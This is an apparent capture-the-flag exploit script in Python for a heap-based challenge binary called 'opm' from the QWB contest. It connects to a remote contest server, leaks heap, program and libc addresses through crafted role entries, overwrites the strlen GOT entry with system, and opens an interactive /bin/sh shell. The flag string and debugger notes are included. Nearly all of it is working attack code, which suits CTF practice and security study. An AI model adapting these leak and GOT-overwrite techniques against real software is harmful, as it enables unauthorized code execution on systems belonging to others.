#!/usr/bin/env python
# coding:utf-8

# ./exploit.py NOPTRACE ASLR LIBC=libc.so MODE=remote;
# QWB{You_know_y0u_4r3_hack3333r}

from ctf import *

binary = './opm'
context.log_level = 'INFO'
context.terminal = ['tmux', 'splitw', '-h']
if not args['ASLR']:
    context.aslr = False
mode = args['MODE'].lower()
# os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
if args['LIBC']:
    libc = args['LIBC']
    os.environ['LD_PRELOAD'] = os.path.abspath(libc)
else:
    libc = [x for x in elf.libs.keys() if 'libc.so' in x]
    libc = libc and libc[0] or './libc.so.6'
info('libc: %s', libc)
libc = ELF(libc)


def exploit():
    if mode == 'debug':
        io = gdb.debug(binary, gdbscript='''
            c
        ''')
        # io = debug(binary)
        # io.c()
        # io.interactive()
    elif mode == 'remote':
        io = remote('39.107.33.43', 13572)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def add_role(name, punch=0):
        io.sendlineafter('(A)dd', 'A')
        io.sendline(name)
        io.sendline(punch)

    def add_role_vul(name, punch=0):
        io.sendline(name)
        io.sendline(punch)

    for i in xrange(5):
        add_role(cyclic(126))  # + p8(0x80))
    add_role(cyclic(0x10))  #, cyclic(128) + p8(0x80))
    add_role('A' * 5 + p64(0xffffffffff6008ff))
    add_role('\0' * 0x10)

    # if mode == 'debug':
    #     io.interrupt()
    #     io.b(0x0000555555554C61)
    #     io.c()
    # if mode == 'debug':

    # add_role(cyclic(0x10), '0\0'.ljust(128) + '\n')
    # gdb.attach(
    #     io,
    #     gdbscript='''
    #     b *0x0000555555554C61
    #     b *0x0000555555554BCE
    #     c
    # #''')
    # add_role(cyclic(0x10), ljust('{:d}'.format(0x62000000), 128) + p8(0x5))
    payload = ljust('{:d}'.format(0x62000000), 128) + p8(0x65)
    add_role(payload, payload)
    # set *(char *)($rbp - 0x1a0 + 128 + 1) = 0x90
    # dq 0x00005555557560E0 10

    add_role('\0'.ljust(128) + p8(0x4e), cyclic(128) + p8(0x80))

    io.sendlineafter('(A)dd', 'S')
    add_role_vul('\0'.ljust(128) + p8(0x45))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.sendlineafter('(A)dd', 'S')
    add_role_vul('\0'.ljust(128) + p8(0x14))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.sendlineafter('(A)dd', 'S')
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0x3a000055), 128) + p8(0x1d))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.recvline_endswith('ff600800 punches')
    io.recvuntil('<')
    leaked = io.recvuntil('>', drop=True)
    a_heap_ptr = unpack('\x00\x00' + leaked, 'all')  # 000055afc5580000
    info('a heap pointer: %#x', a_heap_ptr)

    io.sendlineafter('(A)dd', 'S')
    low = (a_heap_ptr + 0x30) & 0xffffffff
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(low), 128) + p8(0x20))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.recvline_endswith('ff600800 punches')
    io.recvuntil('<')
    leaked = io.recvuntil('>', drop=True)
    show_addr = unpack(leaked, 'all')
    elf.address = show_addr - 0xB30
    info('show address: %#x', show_addr)
    info('elf base address: %#x', elf.address)

    io.sendlineafter('(A)dd', 'S')
    low = elf.got['puts'] & 0xffffffff
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(low), 128) + p8(0xa8))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.sendlineafter('(A)dd', 'S')
    high = elf.got['puts'] >> 32
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(high), 128) + p8(0xac))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.sendlineafter('(A)dd', 'S')
    add_role_vul(cyclic(0x10), ljust('\0', 128) + p8(0xb8))
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))
    io.recvuntil('<')
    leaked = io.recvuntil('>', drop=True)
    puts_addr = unpack(leaked, 'all')
    info('puts address: %#x', puts_addr)
    libc.address = puts_addr - libc.symbols['puts']
    info('libc base address: %#x', libc.address)

    # io.sendlineafter('(A)dd', 'S')
    # low = libc.symbols['system'] & 0xffffffff
    # add_role_vul(cyclic(0x10), ljust('{:d}'.format(low), 128) + p8(0xa8))
    # add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    # io.sendlineafter('(A)dd', 'S')
    # high = libc.symbols['system'] >> 32
    # add_role_vul(cyclic(0x10), ljust('{:d}'.format(high), 128) + p8(0xac))
    # add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    # raw_input('press to get shell!')
    # io.sendlineafter('(A)dd', 'S')
    # add_role_vul(cyclic(0x10), ljust('/bin/sh\0', 128) + p8(0xc0))

    io.sendlineafter('(A)dd', 'S')
    low = libc.symbols['system'] & 0xffffffff
    addr = elf.got['strlen'] - 0x18
    add_role_vul(
        cyclic(0x10), ljust('{:d}'.format(low), 128) + pack(addr, 'all'))
    # add_role_vul(cyclic(0x10), ljust('{:d}'.format(0xff600800), 128) + p8(0x4d))

    io.sendline('/bin/sh')
    """
    io.sendlineafter('(A)dd', 'S')
    # add_role_vul('1')
    add_role_vul('\0'.ljust(128) + p8(0x14))

    io.clean(1)
    # TODO: remember to modify
    add_role_vul(cyclic(0x10), ljust('{:d}'.format(0x30000055), 128) + p8(0x1d))
    # add_role(cyclic(0x10), ljust('{:d}'.format(0x62000000), 128) + p8(0x1e))
    # raw_input('continue?')
    # gdb.attach(io, gdbscript='''
    # #''')

    io.recvline_endswith('punches')
    io.recvuntil('<')
    leaked = io.recvuntil('>', drop=True)

    show_addr = unpack(leaked, 'all')
    base_addr = show_addr - 0xB30
    info('show addres: %#x', show_addr)
    info('elf base address: %#x', base_addr)
    """

    io.interactive()


if __name__ == '__main__':
    while True:
        try:
            exploit()
        except Exception as err:
            pass
"""
set *(char *)($rbp - 0x1a0 + 128 + 1) = 0x90
c

set *(long long *)0x00005555557560e0=0x0000555555769080
set *(long long *)0x00005555557560e8=0x0000555555769080
set *(long long *)0x00005555557560f0=0x0000555555769080
set *(long long *)0x00005555557560f8=0x0000555555769080
set *(long long *)0x0000555555756100=0x0000555555769080
set *(long long *)0x0000555555756108=0x0000555555769080
b *0x0000555555554DFF
dq 0x00005555557560E0 10

d br 1
d br 2
"""
